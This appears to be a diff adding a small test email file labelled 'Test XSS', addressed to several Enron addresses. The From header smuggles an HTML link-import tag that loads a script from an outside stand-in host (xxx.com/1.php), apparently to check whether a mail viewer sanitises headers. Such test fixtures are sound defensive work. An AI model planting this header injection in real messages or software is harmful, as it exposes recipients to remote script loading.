@@ -1,0 +1,7 @@
+From: <"test<link rel="import" href="http://xxx.com/1.php">@attack.com">
+To: diana.scholtes@enron.com, bill.williams@enron.com, chris.mallory@enron.com, 
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
